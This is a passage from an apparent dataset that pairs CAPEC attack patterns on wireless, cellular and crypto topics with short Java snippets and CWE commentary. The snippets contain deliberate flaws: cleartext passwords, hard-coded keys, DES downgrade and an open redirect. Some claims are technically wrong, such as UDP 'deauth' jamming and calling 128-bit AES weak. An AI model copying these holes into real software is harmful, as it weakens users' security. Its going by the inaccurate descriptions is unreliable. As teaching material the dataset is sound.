        "code_snippet": "import java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class WiFiJamming {\n    public static void main(String[] args) throws IOException {\n        // IP address of the target Wi-Fi network\n        String targetIP = \"192.168.1.1\";\n        int port = 12345; // Common port for Wi-Fi management frames\n        byte[] deauthFrame = new byte[1024]; // Deauthentication frame payload\n\n        // Fill the deauthFrame with data (this is just an example, real deauth frames have specific structure)\n        for (int i = 0; i < deauthFrame.length; i++) {\n            deauthFrame[i] = (byte) 0xFF;\n        }\n\n        InetAddress targetAddress = InetAddress.getByName(targetIP);\n        DatagramPacket packet = new DatagramPacket(deauthFrame, deauthFrame.length, targetAddress, port);\n        DatagramSocket socket = new DatagramSocket();\n\n        // Continuously send deauthentication frames to jam the Wi-Fi network\n        while (true) {\n            socket.send(packet);\n            System.out.println(\"Deauthentication frame sent to \" + targetIP);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic form of Wi-Fi jamming by continuously sending deauthentication frames to a target Wi-Fi network. The code uses a DatagramSocket to send UDP packets filled with deauthentication frame data to the target IP address and port. This simulates the attack described in the CAPEC by flooding the Wi-Fi access point with deauthentication frames, preventing legitimate users from maintaining a connection. The code also highlights several related CWEs: it does not verify the source or integrity of the communication (CWE-924, CWE-923, CWE-940), and it transmits data in cleartext (CWE-319)."
    },
    {
        "capec_id": "605",
        "capec_name": "Cellular Jamming",
        "code_snippet": "import java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class CellularJammingExample {\n    public static void main(String[] args) throws IOException {\n        DatagramSocket socket = new DatagramSocket();\n        InetAddress address = InetAddress.getByName(\"192.168.1.1\"); // Target cell tower IP\n        byte[] buffer = new byte[1024];\n        String message = \"STATUS_UPDATE\";\n        buffer = message.getBytes();\n\n        // CWE-319: Cleartext Transmission of Sensitive Information\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length, address, 12345);\n\n        // CWE-300: Channel Accessible by Non-Endpoint\n        // CWE-940: Improper Verification of Source of a Communication Channel\n        for (int i = 0; i < 1000; i++) { // Simulate jamming by sending multiple packets\n            socket.send(packet);\n        }\n\n        socket.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of a cellular jamming attack. The code creates a DatagramSocket to send UDP packets to a target IP address (representing a cell tower). The message 'STATUS_UPDATE' is sent repeatedly to simulate overwhelming the cell tower with false status messages. This embodies the CAPEC concept of Cellular Jamming by actively transmitting signals to disrupt communication. The code also highlights several related CWEs: CWE-319 (Cleartext Transmission of Sensitive Information) as the message is sent in cleartext, CWE-300 (Channel Accessible by Non-Endpoint) as the channel can be accessed by unauthorized actors, and CWE-940 (Improper Verification of Source of a Communication Channel) as the source of the communication is not verified."
    },
    {
        "capec_id": "606",
        "capec_name": "Weakening of Cellular Encryption",
        "code_snippet": "import javax.crypto.Cipher;\nimport javax.crypto.KeyGenerator;\nimport javax.crypto.SecretKey;\nimport java.security.NoSuchAlgorithmException;\nimport java.security.SecureRandom;\n\npublic class CellularEncryption {\n    public static void main(String[] args) throws Exception {\n        // Simulate negotiation of encryption algorithm\n        String[] algorithms = {\"AES\", \"DES\", \"Blowfish\"};\n        String selectedAlgorithm = negotiateAlgorithm(algorithms);\n\n        // Generate key\n        SecretKey key = generateKey(selectedAlgorithm);\n\n        // Initialize cipher with selected algorithm\n        Cipher cipher = Cipher.getInstance(selectedAlgorithm);\n        cipher.init(Cipher.ENCRYPT_MODE, key);\n\n        // Encrypt data\n        String data = \"Sensitive Data\";\n        byte[] encryptedData = cipher.doFinal(data.getBytes());\n\n        System.out.println(\"Encrypted Data: \" + new String(encryptedData));\n    }\n\n    private static String negotiateAlgorithm(String[] algorithms) {\n        // Simulate a downgrade attack by selecting a weaker algorithm\n        for (String algorithm : algorithms) {\n            if (algorithm.equals(\"DES\")) {\n                return algorithm;\n            }\n        }\n        return algorithms[0]; // Default to the first algorithm if no match\n    }\n\n    private static SecretKey generateKey(String algorithm) throws NoSuchAlgorithmException {\n        KeyGenerator keyGen = KeyGenerator.getInstance(algorithm);\n        keyGen.init(new SecureRandom());\n        return keyGen.generateKey();\n    }\n}",
        "description": "This Java code snippet simulates a scenario where a cellular device negotiates an encryption algorithm with a base station. The `negotiateAlgorithm` method demonstrates a downgrade attack by selecting a weaker algorithm (DES) even if stronger algorithms (AES, Blowfish) are available. This embodies the CAPEC's main idea of weakening cellular encryption through algorithm downgrade (CWE-757). The code also highlights the use of a potentially broken or risky cryptographic algorithm (CWE-327) and inadequate encryption strength (CWE-326). The `generateKey` method creates a cryptographic key for the selected algorithm, and the `Cipher` class is used to encrypt sensitive data, demonstrating the potential vulnerabilities in the encryption process."
    },
    {
        "capec_id": "607",
        "capec_name": "Obstruction",
        "code_snippet": "import java.util.concurrent.locks.Lock;\nimport java.util.concurrent.locks.ReentrantLock;\n\npublic class ObstructionExample {\n    private Lock lock = new ReentrantLock();\n    private boolean isComponentAvailable = true;\n\n    public void accessComponent() {\n        if (lock.tryLock()) {\n            try {\n                if (isComponentAvailable) {\n                    System.out.println(\"Component is available and working.\");\n                } else {\n                    System.out.println(\"Component is obstructed and not available.\");\n                }\n            } finally {\n                lock.unlock();\n            }\n        } else {\n            System.out.println(\"Component access is obstructed by another process.\");\n        }\n    }\n\n    public void obstructComponent() {\n        lock.lock();\n        try {\n            isComponentAvailable = false;\n            System.out.println(\"Component has been obstructed.\");\n        } finally {\n            lock.unlock();\n        }\n    }\n\n    public static void main(String[] args) {\n        ObstructionExample example = new ObstructionExample();\n\n        // Simulate normal access\n        example.accessComponent();\n\n        // Simulate obstruction\n        example.obstructComponent();\n\n        // Attempt to access the obstructed component\n        example.accessComponent();\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Obstruction' as described in the CAPEC. The `ObstructionExample` class uses a `ReentrantLock` to simulate the obstruction of a system component. The `accessComponent` method attempts to access the component, checking if it is available. If the component is obstructed, it prints a message indicating the obstruction. The `obstructComponent` method simulates an attacker obstructing the component by setting `isComponentAvailable` to false and locking the component. This example embodies the idea of an attacker obstructing interactions between system components, causing the system to degrade or stop working as intended. The use of locks and state checks represents the related CWEs, such as improper isolation and protection mechanism failures."
    },
    {
        "capec_id": "608",
        "capec_name": "Cryptanalysis of Cellular Encryption",
        "code_snippet": "import javax.crypto.Cipher;\nimport javax.crypto.KeyGenerator;\nimport javax.crypto.SecretKey;\nimport javax.crypto.spec.SecretKeySpec;\nimport java.util.Base64;\n\npublic class CellularEncryption {\n    // CWE-321: Use of Hard-coded Cryptographic Key\n    private static final String HARD_CODED_KEY = \"1234567890123456\"; // 16-byte key for AES\n\n    public static void main(String[] args) throws Exception {\n        String plainText = \"Sensitive Data\";\n\n        // CWE-327: Use of a Broken or Risky Cryptographic Algorithm (DES)\n        Cipher cipher = Cipher.getInstance(\"DES\");\n        SecretKeySpec keySpec = new SecretKeySpec(HARD_CODED_KEY.getBytes(), \"DES\");\n        cipher.init(Cipher.ENCRYPT_MODE, keySpec);\n        byte[] encryptedData = cipher.doFinal(plainText.getBytes());\n        String encryptedText = Base64.getEncoder().encodeToString(encryptedData);\n        System.out.println(\"Encrypted Text: \" + encryptedText);\n\n        // CWE-757: Selection of Less-Secure Algorithm During Negotiation\n        // Simulating a downgrade attack by forcing the use of DES instead of a stronger algorithm like AES\n        cipher = Cipher.getInstance(\"DES\");\n        cipher.init(Cipher.DECRYPT_MODE, keySpec);\n        byte[] decryptedData = cipher.doFinal(Base64.getDecoder().decode(encryptedText));\n        String decryptedText = new String(decryptedData);\n        System.out.println(\"Decrypted Text: \" + decryptedText);\n    }\n}",
        "description": "This Java code snippet demonstrates several vulnerabilities related to the 'Cryptanalysis of Cellular Encryption' CAPEC. The code uses a hard-coded cryptographic key (CWE-321), which is a significant security risk. It employs the DES algorithm (CWE-327), known to be broken and risky. Additionally, it simulates an algorithm downgrade attack (CWE-757) by forcing the use of DES instead of a stronger algorithm like AES. The code encrypts and decrypts a piece of sensitive data, showcasing how weak encryption can be exploited."
    },
    {
        "capec_id": "609",
        "capec_name": "Cellular Traffic Intercept",
        "code_snippet": "import java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class VulnerableCommunication {\n    public static void main(String[] args) {\n        try {\n            // CWE-319: Cleartext Transmission of Sensitive Information\n            String sensitiveData = \"username=admin&password=admin123\";\n            URL url = new URL(\"http://example.com/login\");\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"POST\");\n            connection.setDoOutput(true);\n\n            // CWE-311: Missing Encryption of Sensitive Data\n            OutputStream os = connection.getOutputStream();\n            os.write(sensitiveData.getBytes());\n            os.flush();\n            os.close();\n\n            int responseCode = connection.getResponseCode();\n            System.out.println(\"Response Code: \" + responseCode);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable communication scenario where sensitive information is transmitted in cleartext over an HTTP connection. The code sends a username and password to a server without encryption (CWE-319: Cleartext Transmission of Sensitive Information and CWE-311: Missing Encryption of Sensitive Data). This makes the data susceptible to interception by malicious actors, embodying the main idea of the CAPEC 'Cellular Traffic Intercept'. The code does not verify the source of the communication channel (CWE-940) and does not ensure message integrity during transmission (CWE-924), further increasing the risk of interception and tampering."
    },
    {
        "capec_id": "610",
        "capec_name": "Cellular Data Injection",
        "code_snippet": "import java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.Socket;\n\npublic class CellularDataInjection {\n    public static void main(String[] args) {\n        String sensitiveData = \"UserPassword=12345\"; // CWE-201: Insertion of Sensitive Information Into Sent Data\n        String cleartextMessage = \"GET / HTTP/1.1\\nHost: example.com\\n\\n\" + sensitiveData; // CWE-319: Cleartext Transmission of Sensitive Information\n\n        try (Socket socket = new Socket(\"example.com\", 80)) {\n            OutputStream outputStream = socket.getOutputStream();\n            outputStream.write(cleartextMessage.getBytes());\n            outputStream.flush();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple example of cellular data injection by sending a cleartext HTTP request containing sensitive information. The code connects to a server (example.com) on port 80 and sends an HTTP GET request with sensitive data (a user password) appended to the request. This embodies the main idea of the CAPEC by showing how an adversary could inject data into mobile technology traffic to disrupt communications or conduct surveillance. The code also highlights several related CWEs: CWE-201 (insertion of sensitive information into sent data), CWE-319 (cleartext transmission of sensitive information), and CWE-924 (improper enforcement of message integrity during transmission)."
    },
    {
        "capec_id": "611",
        "capec_name": "BitSquatting",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/redirect\")\npublic class RedirectServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String targetUrl = request.getParameter(\"url\");\n        if (targetUrl != null && !targetUrl.isEmpty()) {\n            response.sendRedirect(targetUrl);\n        } else {\n            response.sendRedirect(\"https://trusted-domain.com\");\n        }\n    }\n}\n",
        "description": "This Java servlet code demonstrates a potential vulnerability related to BitSquatting and several CWEs. The servlet takes a 'url' parameter from the HTTP GET request and redirects the user to that URL. This can be exploited if an attacker registers a domain name that is one bit different from a trusted domain (BitSquatting). The code also embodies CWE-601 (Open Redirect) as it redirects to a user-controlled URL, CWE-598 (Use of GET Request Method With Sensitive Query Strings) as it uses GET parameters, and CWE-494 (Download of Code Without Integrity Check) if the redirected URL points to a malicious site. This code snippet highlights the risks of improper URL redirection and the potential for BitSquatting attacks."
    },
    {
        "capec_id": "612",
        "capec_name": "WiFi MAC Address Tracking",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class WiFiMACAddressTracker {\n    public static void main(String[] args) throws Exception {\n        DatagramSocket socket = new DatagramSocket(9999);\n        byte[] buffer = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n\n        while (true) {\n            socket.receive(packet);\n            String receivedData = new String(packet.getData(), 0, packet.getLength());\n            String macAddress = extractMACAddress(receivedData);\n            if (macAddress != null) {\n                System.out.println(\"Tracked MAC Address: \" + macAddress);\n            }\n        }\n    }\n\n    private static String extractMACAddress(String data) {\n        // Simplified extraction logic for demonstration purposes\n        if (data.contains(\"MAC:\")) {\n            return data.substring(data.indexOf(\"MAC:\") + 4, data.indexOf(\"MAC:\") + 21);\n        }\n        return null;\n    }\n}",
        "description": "This Java code snippet demonstrates a basic implementation of a WiFi MAC address tracker. The program listens for incoming UDP packets on port 9999, extracts MAC addresses from the received data, and prints them to the console. This embodies the main idea of the CAPEC 'WiFi MAC Address Tracking' by passively listening for WiFi messages and logging the associated MAC addresses. The code also touches on related CWEs: it transmits sensitive information (CWE-201), does not verify the identity of actors (CWE-300), and opens a communication channel that could be accessed by unauthorized actors (CWE-421)."
    },
    {
        "capec_id": "613",
        "capec_name": "WiFi SSID Tracking",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class WiFiSSIDTracker {\n    public static void main(String[] args) throws Exception {\n        DatagramSocket socket = new DatagramSocket(9999);\n        byte[] buffer = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n\n        while (true) {\n            socket.receive(packet);\n            String receivedData = new String(packet.getData(), 0, packet.getLength());\n            if (receivedData.contains(\"SSID:\")) {\n                String ssid = receivedData.split(\"SSID:\")[1].split(\" \")[0];\n                System.out.println(\"Captured SSID: \" + ssid);\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple WiFi SSID tracker. It listens for incoming UDP packets on port 9999, which is a common method for capturing WiFi management frames in a simulated environment. When a packet is received, it checks if the packet contains the string 'SSID:'. If found, it extracts and prints the SSID. This code embodies the main idea of the CAPEC 'WiFi SSID Tracking' by passively listening for SSID information in network traffic. The code also highlights CWE-201 by showing how sensitive information (SSID) can be transmitted and captured. Additionally, it touches on CWE-300, as the communication channel is not secured, allowing any actor to access the transmitted data."
    },
    {
        "capec_id": "614",
        "capec_name": "Rooting SIM Cards",
        "code_snippet": "import javax.crypto.Cipher;\nimport javax.crypto.spec.SecretKeySpec;\nimport java.util.Base64;\n\npublic class SimCardAttack {\n    private static final String ALGORITHM = \"DES\";\n    private static final String DES_KEY = \"12345678\"; // Weak DES key\n\n    public static void main(String[] args) {\n        try {\n            String payload = \"Send SMS to 12345\";\n            String encryptedPayload = encryptPayload(payload, DES_KEY);\n            System.out.println(\"Encrypted Payload: \" + encryptedPayload);\n\n            // Simulate sending the encrypted payload as an OTA update\n            sendOTAPayload(encryptedPayload);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static String encryptPayload(String payload, String key) throws Exception {\n        Cipher cipher = Cipher.getInstance(ALGORITHM);\n        SecretKeySpec keySpec = new SecretKeySpec(key.getBytes(), ALGORITHM);\n        cipher.init(Cipher.ENCRYPT_MODE, keySpec);\n        byte[] encryptedBytes = cipher.doFinal(payload.getBytes());\n        return Base64.getEncoder().encodeToString(encryptedBytes);\n    }\n\n    private static void sendOTAPayload(String encryptedPayload) {\n        // Simulate sending the payload via OTA update\n        System.out.println(\"Sending OTA Payload: \" + encryptedPayload);\n        // In a real scenario, this would be sent as a binary SMS to the SIM card\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of the 'Rooting SIM Cards' attack described in the CAPEC. The code uses a weak DES key to encrypt a payload, which is then simulated to be sent as an OTA (Over-The-Air) update. The use of DES (Data Encryption Standard) is highlighted as a risky cryptographic algorithm (CWE-327) due to its vulnerability to cracking. The encrypted payload represents the executable code that could be sent to the SIM card, potentially allowing an attacker to perform malicious actions such as sending SMS messages or querying the phone's location. This example encapsulates the main idea of exploiting weak cryptographic algorithms to compromise SIM card security."
    },
    {
        "capec_id": "615",
        "capec_name": "Evil Twin Wi-Fi Attack",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class VulnerableWiFiClient {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"http://example.com/login\"); // CWE-319: Cleartext Transmission of Sensitive Information\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"POST\");\n            conn.setDoOutput(true);\n\n            String payload = \"username=admin&password=admin\";\n            OutputStreamWriter writer = new OutputStreamWriter(conn.getOutputStream());\n            writer.write(payload);\n            writer.flush();\n            writer.close();\n\n            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n            reader.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable Wi-Fi client that connects to a server and transmits sensitive information (username and password) in cleartext (CWE-319). The code does not verify the identity of the server (CWE-923) or ensure the integrity of the communication channel (CWE-924). This makes it susceptible to an Evil Twin Wi-Fi Attack, where an adversary sets up a rogue Wi-Fi access point to intercept and capture the transmitted data. The code also does not verify the source of the communication channel (CWE-940), allowing an attacker to impersonate the legitimate server."
    },
    {
        "capec_id": "616",
        "capec_name": "Establish Rogue Location",
        "code_snippet": "import java.io.*;\n\npublic class RogueLocationExample {\n    public static void main(String[] args) {\n        String filePath = \"/trusted/path/config.txt\";\n        if (args.length > 0) {\n            filePath = args[0]; // CWE-426: Untrusted Search Path\n        }\n        try {\n            BufferedReader reader = new BufferedReader(new FileReader(filePath));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line); // CWE-200: Exposure of Sensitive Information\n            }\n            reader.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where an adversary can establish a rogue location by providing a malicious file path as an argument. The code reads and prints the contents of a file specified by the user, which can lead to several security issues:\n\n1. **CWE-426: Untrusted Search Path** - The code allows an external input to specify the file path, which can point to a malicious file instead of the intended trusted file.\n2. **CWE-200: Exposure of Sensitive Information** - The code reads and prints the contents of the file, potentially exposing sensitive information to unauthorized actors.\n\nThe main idea of the CAPEC is represented by allowing an adversary to provide a malicious resource location, which the victim then accesses, leading to potential exposure of sensitive information and other security issues."
    },
    {
        "capec_id": "617",
        "capec_name": "Cellular Rogue Base Station",
        "code_snippet": "import java.net.Socket;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\n\npublic class RogueBaseStation {\n    private static final String TRUSTED_BASE_STATION_IP = \"192.168.1.1\";\n    private static final int BASE_STATION_PORT = 12345;\n\n    public static void main(String[] args) {\n        try {\n            Socket socket = new Socket(TRUSTED_BASE_STATION_IP, BASE_STATION_PORT);\n            InputStream input = socket.getInputStream();\n            OutputStream output = socket.getOutputStream();\n\n            // Simulate communication with the base station\n            byte[] buffer = new byte[1024];\n            int bytesRead = input.read(buffer);\n\n            // Vulnerability: No verification of the source of the communication channel\n            System.out.println(\"Received: \" + new String(buffer, 0, bytesRead));\n\n            // Respond back to the base station\n            String response = \"Hello, Base Station!\";\n            output.write(response.getBytes());\n\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified scenario where a device connects to a base station without verifying the authenticity of the base station. The code establishes a socket connection to a predefined IP address and port, simulating communication with a base station. However, it lacks proper verification mechanisms to ensure that the base station is legitimate, embodying the main idea of the 'Cellular Rogue Base Station' attack. This vulnerability is related to several CWEs, such as CWE-940 (Improper Verification of Source of a Communication Channel) and CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints), as the code does not verify the source or integrity of the communication channel."
    },
    {
        "capec_id": "618",
        "capec_name": "Cellular Broadcast Message Request",
        "code_snippet": "import java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class CellularBroadcastAttack {\n    public static void main(String[] args) {\n        String targetPhoneNumber = \"+1234567890\";\n        String locationAreaCode = \"12345\";\n        try {\n            // CWE-940: Improper Verification of Source of a Communication Channel\n            URL url = new URL(\"http://example.com/sendBroadcast?phone=\" + targetPhoneNumber + \"&lac=\" + locationAreaCode);\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"GET\");\n\n            // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n            String inputLine;\n            StringBuffer response = new StringBuffer();\n            while ((inputLine = in.readLine()) != null) {\n                response.append(inputLine);\n            }\n            in.close();\n\n            // CWE-201: Insertion of Sensitive Information Into Sent Data\n            System.out.println(\"Broadcast message sent to: \" + targetPhoneNumber + \" in LAC: \" + locationAreaCode);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of the 'Cellular Broadcast Message Request' attack scenario described in the CAPEC. The code sends a broadcast message to a target mobile phone number within a specific Location Area Code (LAC). The code does not properly verify the source of the communication channel (CWE-940), does not ensure message integrity during transmission (CWE-924), and includes sensitive information in the transmitted data (CWE-201). This allows an attacker to potentially track the location of the target by triggering and listening for broadcast messages."
    },
    {
        "capec_id": "619",
        "capec_name": "Signal Strength Tracking",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.util.Arrays;\n\npublic class SignalStrengthTracker {\n    private static final int PORT = 9876;\n    private static final String TARGET_IP = \"192.168.1.100\";\n\n    public static void main(String[] args) {\n        try {\n            DatagramSocket socket = new DatagramSocket();\n            InetAddress targetAddress = InetAddress.getByName(TARGET_IP);\n\n            // Simulate sending sensitive information\n            String sensitiveData = \"IMSI: 123456789012345\";\n            byte[] sendData = sensitiveData.getBytes();\n            DatagramPacket sendPacket = new DatagramPacket(sendData, sendData.length, targetAddress, PORT);\n            socket.send(sendPacket);\n\n            // Simulate receiving signal strength data\n            byte[] receiveData = new byte[1024];\n            DatagramPacket receivePacket = new DatagramPacket(receiveData, receiveData.length);\n            socket.receive(receivePacket);\n\n            // Process received data (e.g., signal strength)\n            String receivedSignalStrength = new String(receivePacket.getData(), 0, receivePacket.getLength());\n            System.out.println(\"Received Signal Strength: \" + receivedSignalStrength);\n\n            // Vulnerability: No verification of the source of the received data\n            if (Arrays.equals(receivePacket.getAddress().getAddress(), targetAddress.getAddress())) {\n                System.out.println(\"Data received from expected source.\");\n            } else {\n                System.out.println(\"Warning: Data received from unexpected source!\");\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an attacker can track the signal strength of a target's cellular or WiFi signal. The code simulates sending sensitive information (IMSI) to a target IP address and receiving signal strength data. The vulnerabilities highlighted include: \n1. Insertion of sensitive information into sent data (CWE-201) - The IMSI is sent without encryption.\n2. Improper verification of the source of a communication channel (CWE-940) - The code checks the source of the received data but does not enforce strict verification.\n3. Improper enforcement of message integrity during transmission (CWE-924) - The code does not ensure that the received message was not modified during transmission.\nThis code represents the main idea of the CAPEC by showing how an attacker can exploit signal strength tracking to identify the source location of the signal."
    },
    {
        "capec_id": "620",
        "capec_name": "Drop Encryption Level",
        "code_snippet": "import javax.crypto.Cipher;\nimport javax.crypto.KeyGenerator;\nimport javax.crypto.SecretKey;\nimport java.security.NoSuchAlgorithmException;\nimport java.security.SecureRandom;\n\npublic class EncryptionExample {\n    public static void main(String[] args) throws Exception {\n        String data = \"Sensitive Data\";\n        SecretKey key = generateKey(\"AES\"); // CWE-321: Hard-coded key\n        String encryptedData = encryptData(data, key, \"AES\");\n        System.out.println(\"Encrypted Data: \" + encryptedData);\n    }\n\n    public static SecretKey generateKey(String algorithm) throws NoSuchAlgorithmException {\n        KeyGenerator keyGen = KeyGenerator.getInstance(algorithm);\n        keyGen.init(128); // CWE-326: Inadequate encryption strength\n        return keyGen.generateKey();\n    }\n\n    public static String encryptData(String data, SecretKey key, String algorithm) throws Exception {\n        Cipher cipher = Cipher.getInstance(algorithm);\n        cipher.init(Cipher.ENCRYPT_MODE, key);\n        byte[] encryptedBytes = cipher.doFinal(data.getBytes());\n        return new String(encryptedBytes);\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an attacker could force the encryption level to be lowered, making the encrypted data vulnerable. The code uses a hard-coded cryptographic key (CWE-321) and an inadequate encryption strength (CWE-326) by initializing the key generator with a 128-bit key size, which may not be strong enough for certain applications. The `generateKey` method creates a key using the AES algorithm, and the `encryptData` method encrypts the sensitive data using this key. This example embodies the main idea of the CAPEC 'Drop Encryption Level' by showing how weak encryption practices can lead to vulnerabilities."
    },
    {
        "capec_id": "621",
        "capec_name": "Analysis of Packet Timing and Sizes",
        "code_snippet": "import java.io.OutputStream;\nimport java.net.Socket;\n\npublic class PacketTimingAnalysis {\n    public static void main(String[] args) {\n        String sensitiveData = \"Sensitive Information\";\n        String serverAddress = \"192.168.1.1\";\n        int port = 8080;\n\n        try (Socket socket = new Socket(serverAddress, port);\n             OutputStream outputStream = socket.getOutputStream()) {\n\n            // Simulate sending data with observable timing discrepancies\n            for (char c : sensitiveData.toCharArray()) {\n                outputStream.write(c);\n                outputStream.flush();\n                // Introduce a delay to simulate timing channel\n                Thread.sleep(100); // CWE-208: Observable Timing Discrepancy\n            }\n\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where sensitive information is transmitted over a network with observable timing discrepancies. The code sends each character of a sensitive string ('Sensitive Information') to a server at '192.168.1.1' on port 8080, introducing a delay between each character transmission. This delay can be exploited by an attacker to analyze packet timing and infer sensitive information, embodying the main idea of CAPEC-Analysis of Packet Timing and Sizes. The delay represents CWE-208 (Observable Timing Discrepancy), which can be used to infer protected information. The code also implicitly touches on CWE-201 (Insertion of Sensitive Information Into Sent Data) and CWE-319 (Cleartext Transmission of Sensitive Information) as it sends sensitive data over the network without encryption."
    },
    {
        "capec_id": "622",
        "capec_name": "Electromagnetic Side-Channel Attack",
        "code_snippet": "import javax.crypto.Cipher;\nimport javax.crypto.KeyGenerator;\nimport javax.crypto.SecretKey;\nimport java.security.NoSuchAlgorithmException;\nimport java.security.SecureRandom;\n\npublic class VulnerableCrypto {\n    public static void main(String[] args) throws Exception {\n        // Generate a weak cryptographic key\n        KeyGenerator keyGen = KeyGenerator.getInstance(\"AES\");\n        keyGen.init(128); // Weak key size\n        SecretKey secretKey = keyGen.generateKey();\n\n        // Initialize cipher with weak algorithm\n        Cipher cipher = Cipher.getInstance(\"AES/ECB/NoPadding\"); // ECB mode is insecure\n        cipher.init(Cipher.ENCRYPT_MODE, secretKey);\n\n        // Sensitive data to be encrypted\n        String sensitiveData = \"SensitiveInformation\";\n        byte[] encryptedData = cipher.doFinal(sensitiveData.getBytes());\n\n        // Simulate sending sensitive data over an insecure channel\n        sendOverInsecureChannel(encryptedData);\n    }\n\n    private static void sendOverInsecureChannel(byte[] data) {\n        // Simulate sending data without proper protection\n        System.out.println(\"Sending data: \" + new String(data));\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario vulnerable to an Electromagnetic Side-Channel Attack. The code uses a weak cryptographic key (128-bit AES) and an insecure encryption mode (ECB), which are both risky (CWE-327). The sensitive data is then 'encrypted' and sent over an insecure channel (CWE-201, CWE-300). The use of ECB mode makes the encryption susceptible to pattern analysis, and the weak key size makes it easier to break. Additionally, the code does not implement any protection against physical side channels (CWE-1300), making it vulnerable to electromagnetic side-channel attacks where an attacker could potentially recover the cryptographic key by monitoring electromagnetic emissions."
    },
    {
        "capec_id": "623",
        "capec_name": "Compromising Emanations Attack",
        "code_snippet": "import java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.Socket;\n\npublic class SensitiveDataTransmitter {\n    private static final String SERVER_ADDRESS = \"192.168.1.100\";\n    private static final int SERVER_PORT = 8080;\n\n    public static void main(String[] args) {\n        String sensitiveData = \"UserPassword=12345\";\n        try {\n            Socket socket = new Socket(SERVER_ADDRESS, SERVER_PORT);\n            OutputStream outputStream = socket.getOutputStream();\n            outputStream.write(sensitiveData.getBytes());\n            outputStream.flush();\n            outputStream.close();\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where sensitive information (a user's password) is transmitted over a network without proper protection. The code creates a socket connection to a server and sends the sensitive data as plain text. This example embodies the main idea of a Compromising Emanations Attack (CAPEC-201) by showing how sensitive information can be exposed through unintentional signals. The related CWEs are represented as follows:\n\n- CWE-201: The sensitive information (user password) is inserted into the sent data without encryption.\n- CWE-1300: The code does not implement any protection mechanisms to prevent physical side channels from exposing the sensitive information.\n- CWE-1320: There are no alerts or error messages to handle the transmission of sensitive data.\n- CWE-1319: The device is susceptible to electromagnetic fault injection attacks due to the lack of security mechanisms.\n- CWE-1420: The code does not protect against transient execution vulnerabilities that could expose sensitive data."
    },
    {
        "capec_id": "624",
        "capec_name": "Hardware Fault Injection",
